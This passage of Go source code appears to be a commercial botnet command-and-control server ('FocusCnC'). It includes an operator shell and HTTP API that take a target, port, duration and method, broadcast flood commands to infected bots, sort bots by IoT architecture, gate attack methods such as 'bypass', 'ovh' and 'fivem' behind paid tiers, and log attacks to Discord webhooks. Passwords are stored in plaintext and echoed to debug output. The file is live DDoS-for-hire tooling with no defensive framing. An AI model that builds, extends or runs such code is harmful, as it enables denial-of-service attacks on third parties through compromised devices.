			target, portStr := parts[1], parts[2]
			durSec := 60
			if len(parts) >= 4 {
				fmt.Sscanf(parts[3], "%d", &durSec)
			}

			if durSec > acct.MaxTime && !acct.Admin {
				durSec = acct.MaxTime
			}

			if (strings.Contains(cmd, "browser") || strings.Contains(cmd, "bypass") || strings.Contains(cmd, "game") || strings.Contains(cmd, "ovh") || strings.Contains(cmd, "fivem") || strings.Contains(cmd, "minecraft")) && !acct.VipAccess && !acct.Admin {
				t.Write([]byte("[-] Requirement: VIP Access required for this method.\r\n"))
				continue
			}
			if strings.Contains(cmd, "focus") && !acct.FocusAccess && !acct.Admin {
				t.Write([]byte("[-] Requirement: Focus Access required for this method.\r\n"))
				continue
			}
			if strings.Contains(cmd, "holder") || strings.Contains(cmd, "kill-all") {
				if !acct.HMHAccess && !acct.Admin {
					t.Write([]byte("[-] Requirement: HMH Access required for this method.\r\n"))
					continue
				}
			}

			renderTfx(t, "attack.tfx", 80, 24, titleBar, map[string]string{})
			time.Sleep(500 * time.Millisecond)

			attackReplacements := map[string]string{
				"target":      target,
				"port":        portStr,
				"time":        fmt.Sprintf("%ds", durSec),
				"method":      strings.ToUpper(cmd),
				"concurrents": fmt.Sprintf("%d", acct.Concurrents),
				"cooldown":    fmt.Sprintf("%ds", acct.Cooldown),
				"expiry":      formatRemainingTime(acct.Expiry),
				"username":    acct.Username,
			}
			renderTfx(t, "attack_send.tfx", 91, 17, titleBar, attackReplacements)

			bCount := getTotalBots()
			attackFields := map[string]string{
				"Operator":      acct.Username,
				"VIP Rank":      acct.AccountPlan,
				"Method":        strings.ToUpper(cmd),
				"Target":        fmt.Sprintf("%s:%s", target, portStr),
				"Duration":      fmt.Sprintf("%ds", durSec),
				"Bots Deployed": fmt.Sprintf("%d", bCount),
			}
			go sendDiscordEmbedWebhook(WebhookAttack, "FocusCnC - Attack Dispatched", 16711680, attackFields)
			go sendDiscordEmbedWebhook(WebhookGlobal, "FocusCnC - Global Attack Activity", 16711680, attackFields)

			jobsMutex.Lock()
			activeJobs = append(activeJobs, job{
				method: cmd,
				target: target,
				port:   portStr,
				length: time.Duration(durSec) * time.Second,
				began:  time.Now(),
				user:   acct.Username,
			})
			jobsMutex.Unlock()

			broadcast(fmt.Sprintf("%s %s %s %d", cmd, target, portStr, durSec))

		case "exit", "logout":
			return

		default:
			t.Write([]byte("Unknown command. Type 'help' or 'methods'.\r\n"))
		}
	}
}

func handleAPIRequest(w http.ResponseWriter, r *http.Request) {
	query := r.URL.Query()
	username := query.Get("username")
	password := query.Get("password")
	target := query.Get("target")
	port := query.Get("port")
	durationStr := query.Get("duration")
	method := strings.ToUpper(query.Get("method"))

	w.Header().Set("Content-Type", "application/json")

	if username == "" || password == "" || target == "" || port == "" || method == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]any{
			"status": "error",
			"error":  "Missing required parameters",
		})
		return
	}

	ok, acct := checkCreds(username, password)
	if !ok {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]any{
			"status": "error",
			"error":  "Invalid credentials",
		})
		return
	}

	if !acct.APIAccess && !acct.Admin {
		w.WriteHeader(http.StatusForbidden)
		json.NewEncoder(w).Encode(map[string]any{
			"status": "error",
			"error":  "API Access not granted",
		})
		return
	}

	if countActiveGlobalJobs() >= MaxGlobalSlots {
		w.WriteHeader(http.StatusServiceUnavailable)
		json.NewEncoder(w).Encode(map[string]any{
			"status": "error",
			"error":  "Global attack slots full",
		})
		return
	}

	durSec := 60
	if durationStr != "" {
		fmt.Sscanf(durationStr, "%d", &durSec)
	}
	if durSec > acct.MaxTime && !acct.Admin {
		durSec = acct.MaxTime
	}

	botMethod := method
	if !strings.HasPrefix(botMethod, "!") {
		botMethod = "!" + botMethod
	}

	bCount := getTotalBots()
	broadcast(fmt.Sprintf("%s %s %s %d", strings.ToLower(botMethod), target, port, durSec))

	jobsMutex.Lock()
	activeJobs = append(activeJobs, job{
		method: botMethod,
		target: target,
		port:   port,
		length: time.Duration(durSec) * time.Second,
		began:  time.Now(),
		user:   acct.Username,
	})
	jobsMutex.Unlock()

	attackFields := map[string]string{
		"Operator":      acct.Username,
		"VIP Rank":      acct.AccountPlan,
		"Method":        botMethod,
		"Target":        fmt.Sprintf("%s:%s", target, port),
		"Duration":      fmt.Sprintf("%ds", durSec),
		"Bots Deployed": fmt.Sprintf("%d", bCount),
		"Source":        "HTTP API (Browser)",
	}
	go sendDiscordEmbedWebhook(WebhookAttack, "FocusCnC - Attack Dispatched via API", 16711680, attackFields)
	go sendDiscordEmbedWebhook(WebhookGlobal, "FocusCnC - Global Attack Activity", 16711680, attackFields)

	w.WriteHeader(http.StatusOK)
	json.NewEncoder(w).Encode(map[string]any{
		"status":    "success",
		"message":   "Attack dispatched",
		"target":    target,
		"port":      port,
		"duration":  durSec,
		"method":    botMethod,
		"bots_sent": bCount,
	})
}

func sendDiscordEmbedWebhook(url string, title string, color int, fields map[string]string) {
	var embedFields []map[string]any
	for k, v := range fields {
		embedFields = append(embedFields, map[string]any{
			"name":   k,
			"value":  v,
			"inline": true,
		})
	}

	payloadMap := map[string]any{
		"embeds": []map[string]any{
			{
				"title":     title,
				"color":     color,
				"fields":    embedFields,
				"footer":    map[string]string{"text": "FocusCnC Security & Operations Engine"},
				"timestamp": time.Now().UTC().Format(time.RFC3339),
			},
		},
	}

	payload, _ := json.Marshal(payloadMap)
	http.Post(url, "application/json", bytes.NewBuffer(payload))
}

func loadUsers() []UserAccount {
	raw, err := os.ReadFile("users.json")
	if err != nil {
		fmt.Println("[-] loadUsers: could not read users.json:", err)
		return nil
	}
	var users []UserAccount
	if err := json.Unmarshal(raw, &users); err != nil {
		fmt.Println("[-] loadUsers: JSON parse error:", err)
		return nil
	}
	return users
}

func saveUsers(users []UserAccount) {
	raw, _ := json.MarshalIndent(users, "", "  ")
	os.WriteFile("users.json", raw, 0644)
}

func checkCreds(user, pass string) (bool, UserAccount) {
	users := loadUsers()
	// Trim whitespace/newlines that may sneak in from manual JSON edits or SSH clients
	user = strings.TrimSpace(user)
	pass = strings.TrimSpace(pass)
	if len(users) == 0 {
		fmt.Println("[-] checkCreds: users.json empty or unreadable")
	}
	for _, u := range users {
		uName := strings.TrimSpace(u.Username)
		uPass := strings.TrimSpace(u.Password)
		fmt.Printf("[debug] checking user=%q stored=%q passMatch=%v\n", user, uName, uPass == pass)
		if uName == user && uPass == pass {
			if u.Banned {
				fmt.Printf("[-] checkCreds: user %q is banned\n", user)
				return false, UserAccount{}
			}
			return true, u
		}
	}
	return false, UserAccount{}
}

func findUser(username string) (bool, UserAccount) {
	users := loadUsers()
	for _, u := range users {
		if u.Username == username {
			if u.Banned {
				return false, UserAccount{}
			}
			return true, u
		}
	}
	return false, UserAccount{}
}

func countActiveGlobalJobs() int {
	jobsMutex.Lock()
	defer jobsMutex.Unlock()
	var currentJobs []job
	count := 0
	for _, j := range activeJobs {
		if time.Until(j.began.Add(j.length)) > 0 {
			currentJobs = append(currentJobs, j)
			count++
		}
	}
	activeJobs = currentJobs
	return count
}

func getTotalBots() int {
	botsMutex.Lock()
	defer botsMutex.Unlock()
	return len(nodePtrs)
}

func getBotArchitectureBreakdown() map[string]int {
	botsMutex.Lock()
	defer botsMutex.Unlock()
	counts := map[string]int{
		"armv7":  0,
		"x86":    0,
		"armv5":  0,
		"armv8":  0,
		"mips":   0,
		"mipsel": 0,
	}
	for _, bp := range nodePtrs {
		if bp != nil {
			arch := strings.ToLower(strings.TrimSpace(bp.arch))
			if _, exists := counts[arch]; exists {
				counts[arch]++
			} else {
				counts[arch] = 1
			}
		}
	}
	return counts
}

func broadcast(msg string) {
	botsMutex.Lock()
	defer botsMutex.Unlock()
	for _, bp := range nodePtrs {
		if bp != nil && bp.conn != nil {
			bp.conn.Write([]byte(msg + "\n"))
		}
	}
}

func botSession(conn net.Conn) {
	rd := bufio.NewReader(conn)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	archLine, err := rd.ReadString('\n')
	conn.SetReadDeadline(time.Time{})

	arch := "armv7"
	if err == nil {
		cleanArch := strings.TrimSpace(archLine)
		if cleanArch != "" {
			arch = cleanArch
		}
	}

	bp := &botConnection{conn: conn, arch: arch}
	botsMutex.Lock()
	nodePtrs = append(nodePtrs, bp)
	botsMutex.Unlock()

	defer func() {
		conn.Close()
		botsMutex.Lock()
		var newPtrs []*botConnection
		for _, p := range nodePtrs {
			if p != bp {
				newPtrs = append(newPtrs, p)
			}
		}
		nodePtrs = newPtrs
		botsMutex.Unlock()
	}()

	for {
		_, err := rd.ReadString('\n')
		if err != nil {
			break
		}
	}
}
